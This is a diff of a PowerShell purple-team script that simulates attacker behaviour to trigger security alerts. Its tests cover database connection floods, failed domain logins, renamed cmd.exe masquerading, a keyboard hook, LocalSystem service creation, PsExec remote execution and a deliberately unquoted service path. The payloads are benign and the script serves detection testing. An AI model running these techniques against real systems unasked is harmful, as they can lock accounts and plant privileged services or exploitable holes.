+# ============================================================
+# TEST 15: Excessive Database Connections
+# ============================================================
+function Invoke-QDB15_ExcessiveDBConnections {
+    Write-TestHeader "15" "QDB - Excessive Database Connections"
+    if (-not (Wait-ForConfirmation "Excessive Database Connections Simulation")) { return }
+
+    Write-Host "Generating abnormal volume of database connections..." -ForegroundColor White
+
+    $dbServer = $Config.DBServer
+    $dbName = $Config.DBName
+
+    Write-Host "  Attempting to generate concurrent connections to $dbServer/$dbName..." -ForegroundColor Gray
+
+    # Simulate multiple concurrent database connections
+    $connectionStrings = @()
+    $maxConnections = 50
+
+    try {
+        Add-Type -AssemblyName System.Data
+
+        for ($i = 1; $i -le $maxConnections; $i++) {
+            $connString = "Server=$dbServer;Database=$dbName;Trusted_Connection=True;Connection Timeout=5;"
+            $conn = New-Object System.Data.SqlClient.SqlConnection($connString)
+            try {
+                $conn.Open()
+                $connectionStrings += $conn
+                Write-Host "  Connection $i opened" -ForegroundColor DarkGray
+            } catch {
+                Write-Host "  Connection $i failed (expected if DB unreachable): $($_.Exception.Message)" -ForegroundColor DarkYellow
+            }
+            Start-Sleep -Milliseconds 100
+        }
+
+        Write-Host "  Holding $maxConnections connections open for 10 seconds..." -ForegroundColor Yellow
+        Start-Sleep -Seconds 10
+
+    } catch {
+        Write-Host "  DB connection simulation failed (expected if no DB available): $($_.Exception.Message)" -ForegroundColor DarkYellow
+    } finally {
+        # Close all connections
+        foreach ($conn in $connectionStrings) {
+            try { $conn.Close(); $conn.Dispose() } catch { }
+        }
+    }
+
+    Write-TestResult "Excessive DB connection simulation completed. Check source IP, database server, connection count alerts."
+}
+
+# ============================================================
+# TEST 16: Multiple Login Failures from Same Source
+# ============================================================
+function Invoke-QDB16_MultipleLoginFailures {
+    Write-TestHeader "16" "QDB - Authentication: Multiple Login Failures from the Same Source"
+    if (-not (Wait-ForConfirmation "Multiple Login Failures Simulation")) { return }
+
+    Write-Host "Performing repeated failed authentication attempts..." -ForegroundColor White
+
+    $targetAccount = $Config.TestUser
+    $failedAttempts = 15
+
+    for ($i = 1; $i -le $failedAttempts; $i++) {
+        Write-Host "  Failed attempt $i of $failedAttempts for $targetAccount" -ForegroundColor Gray
+
+        $secPassword = ConvertTo-SecureString "WrongPassword$i" -AsPlainText -Force
+        try {
+            $cred = New-Object System.Management.Automation.PSCredential("$Config.Domain\$targetAccount", $secPassword)
+            $null = New-PSDrive -Name "TempFail$i" -PSProvider FileSystem -Root "\\$Config.DomainController\C$" -Credential $cred -ErrorAction Stop
+        } catch {
+            # Expected failure
+        }
+
+        Start-Sleep -Seconds 2
+    }
+
+    Write-TestResult "Multiple login failure simulation completed. Check threshold trigger, source IP, targeted account alerts."
+}
+
+# ============================================================
+# TEST 17: PsExec Process Masquerading
+# ============================================================
+function Invoke-QDB17_PsExecMasquerading {
+    Write-TestHeader "17" "QDB - PsExec Process Masquerading"
+    if (-not (Wait-ForConfirmation "PsExec Masquerading Simulation")) { return }
+
+    Write-Host "Simulating PsExec process masquerading..." -ForegroundColor White
+
+    # Create a renamed copy of a legitimate executable in unusual directory
+    $unusualDir = "$Config.TestFilePath\Masquerade"
+    if (-not (Test-Path $unusualDir)) {
+        New-Item -ItemType Directory -Path $unusualDir -Force | Out-Null
+    }
+
+    # Copy cmd.exe with a renamed filename to simulate masquerading
+    $masqueradedExe = "$unusualDir\svchost_update.exe"
+    Copy-Item "C:\Windows\System32\cmd.exe" $masqueradedExe -Force
+    Write-Host "  Created masqueraded executable: $masqueradedExe" -ForegroundColor Gray
+
+    # Execute the masqueraded binary
+    Write-Host "  Executing masqueraded binary..." -ForegroundColor Gray
+    $process = Start-Process -FilePath $masqueradedExe -ArgumentList "/c echo QDB-PsExec-Masquerade-Test" -PassThru -WindowStyle Hidden -Wait
+    Start-Sleep -Seconds 3
+
+    # Also simulate PsExec-like behavior with renamed psexec
+    $psexecCopy = "$unusualDir\windows_update.exe"
+    if (Test-Path "C:\Tools\PsExec.exe") {
+        Copy-Item "C:\Tools\PsExec.exe" $psexecCopy -Force -ErrorAction SilentlyContinue
+    } elseif (Test-Path "C:\Windows\System32\cmd.exe") {
+        # Fallback: use cmd.exe renamed
+        Copy-Item "C:\Windows\System32\cmd.exe" $psexecCopy -Force
+    }
+
+    Write-Host "  Executing renamed PsExec-like binary..." -ForegroundColor Gray
+    Start-Process -FilePath $psexecCopy -ArgumentList "/c echo QDB-Renamed-PsExec-Test" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 3
+
+    Write-TestResult "PsExec masquerading simulation completed. Check signature, hash, behavior, process path, command line alerts."
+
+    # Cleanup
+    Remove-Item $unusualDir -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# ============================================================
+# TEST 18: Potential Keylogger Detection
+# ============================================================
+function Invoke-QDB18_Keylogger {
+    Write-TestHeader "18" "QDB - Potential Keylogger Detected"
+    if (-not (Wait-ForConfirmation "Keylogger Detection Simulation (SAFE SIMULATOR)")) { return }
+
+    Write-Host "Running approved keylogging simulator (NO real credential capture)..." -ForegroundColor White
+    Write-Host "  Using SetWindowsHookEx simulation for detection testing..." -ForegroundColor Yellow
+
+    # Create a safe keylogging simulator that registers hooks but doesn't capture real credentials
+    $keyloggerScript = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public class KeylogSimulator {
+    [DllImport("user32.dll")]
+    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll")]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static IntPtr _hookId = IntPtr.Zero;
+    private static HookProc _proc = HookCallback;
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        // Simulator only - log that hook was triggered
+        Console.WriteLine("QDB-Keylog-Simulator: Hook triggered at " + DateTime.Now);
+        return CallNextHookEx(_hookId, nCode, wParam, lParam);
+    }
+
+    public static void Run() {
+        Console.WriteLine("QDB-Keylog-Simulator: Starting keyboard hook simulation...");
+        _hookId = SetWindowsHookEx(13, _proc, IntPtr.Zero, 0); // WH_KEYBOARD_LL = 13
+        Console.WriteLine("QDB-Keylog-Simulator: Hook registered. Hook ID: " + _hookId);
+        Thread.Sleep(10000); // Run for 10 seconds
+        UnhookWindowsHookEx(_hookId);
+        Console.WriteLine("QDB-Keylog-Simulator: Hook removed. Simulation complete.");
+    }
+}
+'@
+
+    try {
+        Add-Type -TypeDefinition $keyloggerScript -ErrorAction Stop
+        [KeylogSimulator]::Run()
+    } catch {
+        Write-Host "  Keylogger simulator failed (expected in some environments): $($_.Exception.Message)" -ForegroundColor DarkYellow
+
+        # Fallback: simulate keyboard hook behavior via process
+        Write-Host "  Fallback: Simulating keylogger-like process behavior..." -ForegroundColor Gray
+        $fakeKeylogger = "$Config.TestFilePath\keylog_sim.exe"
+
+        # Create a simple script that mimics keylogger behavior patterns
+        $simScript = @'
+# QDB Keylogger Behavior Simulator
+# This simulates keyboard hook behavior without actual keylogging
+Write-Host "QDB-Keylog-Behavior-Sim: Registering input capture hooks..."
+Start-Sleep -Seconds 10
+Write-Host "QDB-Keylog-Behavior-Sim: Simulation complete"
+'@
+        $simScript | Out-File -FilePath "$Config.TestFilePath\keylog_sim.ps1" -Force
+        powershell.exe -ExecutionPolicy Bypass -File "$Config.TestFilePath\keylog_sim.ps1" -WindowStyle Hidden
+    }
+
+    Write-TestResult "Keylogger simulation completed. Check keyboard-hooking, input-capture, process/user/hostname alerts."
+}
+
+# ============================================================
+# TEST 19: Malicious Service Installed
+# ============================================================
+function Invoke-QDB19_MaliciousService {
+    Write-TestHeader "19" "QDB - Malicious Service Installed"
+    if (-not (Wait-ForConfirmation "Malicious Service Installation Simulation")) { return }
+
+    Write-Host "Creating test service with suspicious characteristics..." -ForegroundColor White
+
+    $serviceName = $Config.ServiceName
+    $suspiciousPath = "$Config.TestFilePath\malicious_svc_test.exe"
+    $suspiciousCmd = "C:\Temp\QDB_Test\suspicious_command.bat"
+
+    # Create suspicious batch file
+    "@echo off`necho QDB-Malicious-Service-Test > $Config.TestFilePath\svc_test_output.txt`ntimeout /t 5" | Out-File -FilePath $suspiciousCmd -Force
+
+    # Copy cmd.exe as suspicious executable
+    Copy-Item "C:\Windows\System32\cmd.exe" $suspiciousPath -Force
+
+    # Create service with suspicious path
+    Write-Host "  Creating service: $serviceName" -ForegroundColor Gray
+    Write-Host "  Executable path: $suspiciousPath" -ForegroundColor Gray
+
+    try {
+        sc.exe create $serviceName binPath= "$suspiciousPath /c echo QDB-Service-Test" start= auto DisplayName= "QDB Test Service" obj= "LocalSystem" 2>&1 | Out-Null
+        Write-Host "  Service created successfully" -ForegroundColor Green
+    } catch {
+        Write-Host "  Service creation failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
+    }
+
+    Start-Sleep -Seconds 3
+
+    # Start the service
+    Write-Host "  Starting service..." -ForegroundColor Gray
+    try {
+        sc.exe start $serviceName 2>&1 | Out-Null
+    } catch {
+        Write-Host "  Service start failed (expected): $($_.Exception.Message)" -ForegroundColor DarkYellow
+    }
+
+    Start-Sleep -Seconds 5
+
+    Write-TestResult "Malicious service simulation completed. Check Events 4697/7045, service name, executable path, installation account alerts."
+
+    # Cleanup
+    sc.exe stop $serviceName 2>&1 | Out-Null
+    sc.exe delete $serviceName 2>&1 | Out-Null
+    Remove-Item $suspiciousPath -Force -ErrorAction SilentlyContinue
+    Remove-Item $suspiciousCmd -Force -ErrorAction SilentlyContinue
+}
+
+# ============================================================
+# TEST 20: PsExec Process on Compromised Host
+# ============================================================
+function Invoke-QDB20_PsExecCompromisedHost {
+    Write-TestHeader "20" "QDB - PsExec Process Observed on a Compromised Host"
+    if (-not (Wait-ForConfirmation "PsExec on Compromised Host Simulation")) { return }
+
+    Write-Host "Simulating PsExec remote execution between test systems..." -ForegroundColor White
+
+    $targetHost = $Config.TargetHost
+
+    # Check if PsExec is available
+    $psexecPath = "C:\Tools\PsExec.exe"
+    if (-not (Test-Path $psexecPath)) {
+        # Try common locations
+        $psexecPath = "C:\Windows\System32\PsExec.exe"
+    }
+    if (-not (Test-Path $psexecPath)) {
+        $psexecPath = "C:\Sysinternals\PsExec.exe"
+    }
+
+    if (Test-Path $psexecPath) {
+        Write-Host "  Found PsExec at: $psexecPath" -ForegroundColor Green
+
+        # Execute benign remote command
+        Write-Host "  Executing remote command via PsExec to $targetHost..." -ForegroundColor Gray
+        & $psexecPath \\$targetHost -accepteula cmd.exe /c "echo QDB-PsExec-Remote-Test > C:\Temp\psexec_test.txt" 2>&1 | Out-Null
+        Start-Sleep -Seconds 5
+
+        # Check for PSEXESVC service
+        Write-Host "  Checking for PSEXESVC service on target..." -ForegroundColor Gray
+        try {
+            Get-Service -Name "PSEXESVC" -ComputerName $targetHost -ErrorAction SilentlyContinue
+        } catch {
+            Write-Host "  PSEXESVC check completed" -ForegroundColor DarkYellow
+        }
+    } else {
+        Write-Host "  PsExec not found at common locations. Simulating PsExec behavior..." -ForegroundColor Yellow
+
+        # Simulate PsExec behavior patterns
+        # 1. SMB activity to admin shares
+        Write-Host "  Simulating SMB activity to admin shares..." -ForegroundColor Gray
+        try {
+            $null = New-PSDrive -Name "AdminShare" -PSProvider FileSystem -Root "\\$targetHost\C$" -ErrorAction Stop
+        } catch {
+            Write-Host "  SMB admin share access failed (expected if target unreachable)" -ForegroundColor DarkYellow
+        }
+
+        # 2. Create named pipes (PsExec pattern)
+        Write-Host "  Simulating named pipe creation (PsExec pattern)..." -ForegroundColor Gray
+        $pipeName = "PSEXESVC_QDB_Test"
+        try {
+            $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut)
+            Write-Host "  Named pipe created: $pipeName" -ForegroundColor Gray
+            Start-Sleep -Seconds 5
+            $pipeServer.Dispose()
+        } catch {
+            Write-Host "  Named pipe creation failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
+        }
+
+        # 3. Simulate remote process creation
+        Write-Host "  Simulating remote process via WMI (PsExec alternative)..." -ForegroundColor Gray
+        try {
+            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c echo QDB-PsExec-Sim" -ComputerName $targetHost -ErrorAction Stop
+        } catch {
+            Write-Host "  Remote process simulation failed (expected if target unreachable)" -ForegroundColor DarkYellow
+        }
+    }
+
+    Write-TestResult "PsExec compromised host simulation completed. Check SMB activity, admin shares, PSEXESVC, named pipes alerts."
+}
+
+# ============================================================
+# TEST 21: Unquoted Service Binary Path
+# ============================================================
+function Invoke-QDB21_UnquotedServicePath {
+    Write-TestHeader "21" "QDB - Detected an Unquoted Service Binary Path"
+    if (-not (Wait-ForConfirmation "Unquoted Service Binary Path Simulation")) { return }
+
+    Write-Host "Creating service with unquoted executable path containing spaces..." -ForegroundColor White
+
+    # Create directory with spaces in path
+    $spaceDir = "$Config.TestFilePath\Service Path With Spaces"
+    if (-not (Test-Path $spaceDir)) {
+        New-Item -ItemType Directory -Path $spaceDir -Force | Out-Null
+    }
+
+    # Create executable in the spaced path
+    $unquotedExe = "$spaceDir\QDBService.exe"
+    Copy-Item "C:\Windows\System32\cmd.exe" $unquotedExe -Force
+
+    $unquotedServiceName = "QDBUnquotedSvc"
+    # Note: path contains spaces but is NOT quoted - this is the vulnerability
+    $unquotedPath = "$spaceDir\QDBService.exe /c echo QDB-Unquoted-Path-Test"
+
+    Write-Host "  Service name: $unquotedServiceName" -ForegroundColor Gray
+    Write-Host "  Unquoted path: $unquotedPath" -ForegroundColor Gray
+
+    try {
+        sc.exe create $unquotedServiceName binPath= "$unquotedPath" start= auto DisplayName= "QDB Unquoted Path Test Service" obj= "LocalSystem" 2>&1 | Out-Null
+        Write-Host "  Service with unquoted path created" -ForegroundColor Green
+    } catch {
+        Write-Host "  Service creation failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
+    }
+
+    Start-Sleep -Seconds 3
+
+    Write-TestResult "Unquoted service path simulation completed. Check affected service, full binary path, service name alerts."
+
+    # Cleanup
+    sc.exe delete $unquotedServiceName 2>&1 | Out-Null
+    Remove-Item $spaceDir -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# ============================================================
+# MAIN EXECUTION
+# ============================================================
+function Start-QDBAllTests {
+    Write-Host @"
+
+    ╔══════════════════════════════════════════════════════════╗
+             PURPLE TEAM QDB ALERT GENERATION SCRIPT          ║
+    ║                                                          ║
+    ║  WARNING: RUN ONLY IN CONTROLLED TEST/LAB ENVIRONMENT    ║
+    ║                                                          ║
+    ║  Total Test Cases: 21                                    ║
+    ║  Targets: CrowdStrike, QRadar, Email, DNS, Firewall, DLP ║
+    ╚══════════════════════════════════════════════════════════╝
+
+"@ -ForegroundColor Cyan
+
+    # Safety confirmation
+    Write-Host "This script will generate security alerts in your environment." -ForegroundColor Red
+    Write-Host "Ensure you have:" -ForegroundColor Yellow
+    Write-Host "  1. Authorization to run these tests" -ForegroundColor Yellow
+    Write-Host "  2. SOC team ready to capture screenshots" -ForegroundColor Yellow
+    Write-Host "  3. Test environment isolated from production" -ForegroundColor Yellow
+    Write-Host "  4. Modified the `$Config variables for your environment" -ForegroundColor Yellow
+    Write-Host ""
+
+    $confirm = Read-Host "Type 'CONFIRM' to proceed"
+    if ($confirm -ne "CONFIRM") {
+        Write-Host "Script aborted." -ForegroundColor Red
+        return
+    }
+
+    $startTime = Get-Date
+    Initialize-TestEnvironment
+
+    # Execute all tests sequentially
+    $tests = @(
+        @{ Num = "01"; Name = "Office Child Process"; Func = { Invoke-QDB01_OfficeChildProcess } },
+        @{ Num = "02"; Name = "Password Spraying"; Func = { Invoke-QDB02_PasswordSpraying } },
+        @{ Num = "03"; Name = "LSASS Memory Dump"; Func = { Invoke-QDB03_LSSASSDump } },
+        @{ Num = "04"; Name = "Kerberoasting"; Func = { Invoke-QDB04_Kerberoasting } },
+        @{ Num = "05"; Name = "AD CS Certificate Abuse"; Func = { Invoke-QDB05_ADCSAbuse } },
+        @{ Num = "06"; Name = "Privileged Group Add"; Func = { Invoke-QDB06_PrivilegedGroupAdd } },
+        @{ Num = "07"; Name = "PowerShell Obfuscation"; Func = { Invoke-QDB07_PowerShellObfuscation } },
+        @{ Num = "08"; Name = "Lateral Movement WMI/WinRM"; Func = { Invoke-QDB08_LateralMovement } },
+        @{ Num = "09"; Name = "Scheduled Task Persistence"; Func = { Invoke-QDB09_ScheduledTask } },
+        @{ Num = "10"; Name = "Security Tool Tampering"; Func = { Invoke-QDB10_SecurityToolTampering } },
+        @{ Num = "11"; Name = "Event Log Clearing"; Func = { Invoke-QDB11_EventLogClearing } },
+        @{ Num = "12"; Name = "DNS Tunneling"; Func = { Invoke-QDB12_DNSTunneling } },
+        @{ Num = "13"; Name = "Data Exfiltration"; Func = { Invoke-QDB13_DataExfiltration } },
+        @{ Num = "14"; Name = "Ransomware Simulation"; Func = { Invoke-QDB14_Ransomware } },
+        @{ Num = "15"; Name = "Excessive DB Connections"; Func = { Invoke-QDB15_ExcessiveDBConnections } },
+        @{ Num = "16"; Name = "Multiple Login Failures"; Func = { Invoke-QDB16_MultipleLoginFailures } },
+        @{ Num = "17"; Name = "PsExec Masquerading"; Func = { Invoke-QDB17_PsExecMasquerading } },
+        @{ Num = "18"; Name = "Keylogger Detection"; Func = { Invoke-QDB18_Keylogger } },
+        @{ Num = "19"; Name = "Malicious Service"; Func = { Invoke-QDB19_MaliciousService } },
+        @{ Num = "20"; Name = "PsExec Compromised Host"; Func = { Invoke-QDB20_PsExecCompromisedHost } },
+        @{ Num = "21"; Name = "Unquoted Service Path"; Func = { Invoke-QDB21_UnquotedServicePath } }
+    )
+
+    $completedTests = 0
+    $skippedTests = 0
+    $failedTests = 0
+
+    foreach ($test in $tests) {
+        try {
+            & $test.Func
+            $completedTests++
+        } catch {
+            Write-TestResult "TEST $($test.Num) FAILED: $($_.Exception.Message)" "Red"
+            $failedTests++
+        }
+
+        # Pause between tests for SOC team to capture screenshots
+        Write-Host "`n--- PAUSE: SOC team should capture screenshots now ---" -ForegroundColor Magenta
+        Write-Host "Press ENTER to continue to next test, or 'Q' to quit..." -ForegroundColor Yellow
+        $pauseKey = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        if ($pauseKey.Character -eq 'q' -or $pauseKey.Character -eq 'Q') {
+            Write-Host "Script terminated by user." -ForegroundColor Yellow
+            break
+        }
+    }
+
+    $endTime = Get-Date
+    $duration = $endTime - $startTime
+
+    Write-Host "`n============================================================" -ForegroundColor Cyan
+    Write-Host "                    EXECUTION SUMMARY                        " -ForegroundColor Cyan
+    Write-Host "============================================================" -ForegroundColor Cyan
+    Write-Host "Start Time:    $startTime" -ForegroundColor White
+    Write-Host "End Time:      $endTime" -ForegroundColor White
+    Write-Host "Duration:      $([math]::Round($duration.TotalMinutes, 2)) minutes" -ForegroundColor White
+    Write-Host "Completed:     $completedTests / $($tests.Count)" -ForegroundColor Green
+    Write-Host "Failed:        $failedTests" -ForegroundColor $(if ($failedTests -gt 0) { "Red" } else { "Green" })
+    Write-Host "============================================================" -ForegroundColor Cyan
+
+    Write-Host "`nNext Steps for SOC Team:" -ForegroundColor Cyan
+    Write-Host "1. Review all alerts in CrowdStrike Falcon console" -ForegroundColor White
+    Write-Host "2. Review all offenses in QRadar SIEM" -ForegroundColor White
+    Write-Host "3. Check email security gateway alerts" -ForegroundColor White
+    Write-Host "4. Verify DNS/firewall/DLP telemetry" -ForegroundColor White
+    Write-Host "5. Take screenshots of each detected alert" -ForegroundColor White
+    Write-Host "6. Document detection gaps for undetected tests" -ForegroundColor White
+}
+
+# Run the script
+Start-QDBAllTests
